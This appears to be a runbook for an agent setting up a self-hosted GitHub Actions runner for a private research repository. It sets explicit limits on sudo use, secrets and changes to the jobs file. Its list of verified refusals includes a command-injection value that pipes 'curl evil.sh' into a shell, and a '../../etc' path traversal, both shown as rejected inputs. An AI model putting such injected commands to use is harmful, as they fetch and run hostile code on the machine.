# Runbook: register a GitHub Actions runner for Kahlus-V1

**Audience: an agent executing this on the cluster, with Krish present.**

You are setting up a self-hosted GitHub Actions runner so that jobs can be
dispatched from GitHub instead of being hand-run from DM'd markdown files.

Read the whole file before starting. Where a step can fail, the failure and its
fix are written inline — diagnose and repair on the spot rather than reporting
back and waiting.

---

## Intent — so you can adapt if reality differs

The goal is: **a runner labelled `kahlus-cluster`, attached to
`ptlnextdoor/Kahlus-V1`, running as a service, that can execute the three jobs
declared in `ops/jobs.yaml`.**

Everything below is one way to get there. If your environment differs (different
init system, no sudo, containerised node, different arch), **solve for the goal
rather than following the commands literally**, and say what you changed.

Two jobs matter downstream: `extract_c18` (extract features from the 994-subject
PhysioNet Challenge-2018 corpus — currently 0 extracted) and future GPU sweeps.

## Boundaries — do not cross these

- **This is Krish's hardware.** Do not install anything beyond what is listed,
  do not modify cluster config, do not touch other users' files.
- **Ask Krish before `sudo`.** If passwordless sudo is unavailable, stop and ask
  rather than working around it.
- **Do not put any token, key, or password into the repo**, into a commit, or
  into a log you upload. The registration token below is short-lived; treat it
  as a secret anyway.
- **Do not disable or edit `ops/jobs.yaml`** to make something work. That file is
  the trust boundary. If a job needs changing, report it — the change goes
  through a reviewed commit.
- If anything here looks like it does something it shouldn't, **stop and say so.**

## What this runner can and cannot execute

It runs `scripts/ops/run_job.py`, which accepts a job *name* and typed
parameters, then builds the command line itself from `ops/jobs.yaml`. It does not
accept a command, a shell string, or extra flags from the requester, and it never
invokes a shell.

Registered jobs are exactly: `smoke`, `seal_holdout`, `extract_c18`. A test in
the repo asserts that list cannot silently grow.

Verified refusals:

```
REFUSED: 'rm_rf' is not a registered job.
REFUSED: raw_dir: unsafe path '../../etc'
REFUSED: raw_dir: unsafe path '/tmp/a; curl evil.sh|sh'
REFUSED: workers=9999 above max 64
```

The repo is **private**, which matters — a self-hosted runner on a public repo
would let anyone open a PR that runs code on this machine.

---

## Step 0 — decide where the runner goes

**Option A — on the cluster node.** Simplest; the job runs where the data is.
Use this if permitted.

**Option B — on the Pi, which reaches the cluster.** Use if a runner on the
cluster node is not allowed. Install identically on the Pi, then report back:
we will prefix each `command` in `ops/jobs.yaml` with an SSH invocation, so the
key stays on the Pi and the workflow never sees it.

Ask Krish which applies. Either way the label must be `kahlus-cluster`.

## Step 1 — the registration token (human step)

**You cannot fetch this yourself unless you have an authenticated `gh` with admin
scope.** Ask Krish to open:

`https://github.com/ptlnextdoor/Kahlus-V1/settings/actions/runners/new`

and paste the token. It expires in ~1 hour.

If `gh auth status` shows an account with admin rights on the repo, you may
instead run:

```bash
gh api -X POST repos/ptlnextdoor/Kahlus-V1/actions/runners/registration-token --jq .token
```

If that 403s, fall back to asking Krish. Do not attempt other ways to obtain it.

## Step 2 — install

```bash
mkdir -p ~/actions-runner && cd ~/actions-runner
curl -o actions-runner.tar.gz -L \
  https://github.com/actions/runner/releases/latest/download/actions-runner-linux-x64-2.323.0.tar.gz
tar xzf actions-runner.tar.gz
```

**If the version 404s:** the pinned filename has moved. Get the current asset:

```bash
gh release view --repo actions/runner --json assets \
  --jq '.assets[].name' | grep linux-x64
```

**If the architecture is not x64** (`uname -m` says `aarch64`, e.g. on the Pi):
use the `linux-arm64` asset instead.

Then configure:

```bash
cd ~/actions-runner
./config.sh --url https://github.com/ptlnextdoor/Kahlus-V1 \
            --token <TOKEN_FROM_STEP_1> \
            --labels kahlus-cluster \
            --name chapman \
            --work _work --unattended
```

**Expected:** `√ Connected to GitHub`, then `√ Runner successfully added`.

**If it fails with "Invalid configuration provided for token":** the token
expired. Get a fresh one — they last ~1 hour.

**If it fails with 404:** the URL or repo name is wrong, or the account lacks
access. Confirm the repo is `ptlnextdoor/Kahlus-V1` and is visible to Krish.

## Step 3 — run as a service

```bash
sudo ./svc.sh install && sudo ./svc.sh start && sudo ./svc.sh status
```

**Expected:** `active (running)`.

**If there is no systemd** (container, or a node without it), run it in the
foreground under a process manager Krish already uses, or:

```bash
nohup ./run.sh > ~/actions-runner/runner.log 2>&1 &
```

and say that you did — it will not survive a reboot, which we should know.

**If `sudo` is unavailable:** stop and ask Krish. Do not work around it.

## Step 4 — dependencies

```bash
python3 -m pip install --user wfdb numpy scipy pyyaml
python3 -c "import wfdb, numpy, scipy, yaml; print('deps ok')"
```

**If pip is externally managed** (PEP 668, common on newer distros), use a venv
and report the path so we can point the jobs at it:

```bash
python3 -m venv ~/kahlus-venv
~/kahlus-venv/bin/pip install wfdb numpy scipy pyyaml
```

Then check outbound access to the data:

```bash
aws s3 ls --no-sign-request s3://physionet-open/challenge-2018/1.0.0/training/ | head -3
```

**If `aws` is missing:** `pip install --user awscli`, or test with
`curl -sI https://physionet-open.s3.amazonaws.com/ | head -1` (expect a 200 or
403 — either proves outbound works; a timeout does not).

**If there is no outbound internet from the compute node:** report this. It is
not a blocker but it changes how we fetch data, and we need to know.

## Step 5 — verify without executing anything

From the Actions tab: **cluster job** → Run workflow → job `smoke`, tick
**dry_run**.

This resolves the command line and prints the argv **without running it**. Check
the argv looks sane, then run again without `dry_run`. `smoke` touches only 5
records and finishes in well under a minute.

Alternatively, verify locally without GitHub:

```bash
cd <repo checkout>
python3 scripts/ops/run_job.py --list
python3 scripts/ops/run_job.py --job smoke \
  --params '{"raw_dir":"/tmp/x","out_dir":"/tmp/y"}' --dry-run
```

**If the job queues forever:** the label did not attach. Check
`https://github.com/ptlnextdoor/Kahlus-V1/settings/actions/runners` shows the
runner **idle** with label `kahlus-cluster`. If the label is wrong, re-run
`./config.sh --labels kahlus-cluster` after `./config.sh remove --token <NEW>`.

## Step 6 — report back

Reply with:

1. Option A or B, and on which host.
2. `sudo ./svc.sh status` output (or how it is being run instead).
3. Whether outbound S3 access works from that node.
4. Python environment used — system, `--user`, or a venv path.
5. `nproc`, `free -g`, and `nvidia-smi -L` if GPUs are present.
6. Anything you changed from this runbook and why.
7. The `smoke` run URL if you got that far.

## Turning it off

```bash
sudo ./svc.sh stop && sudo ./svc.sh uninstall
```

Then remove the runner in Settings → Actions → Runners. No other cleanup; nothing
was installed outside `~/actions-runner` and the Python packages above.

---

Full background: `docs/ops/RUNNER_SETUP_FOR_KRISH.md` in the repo.
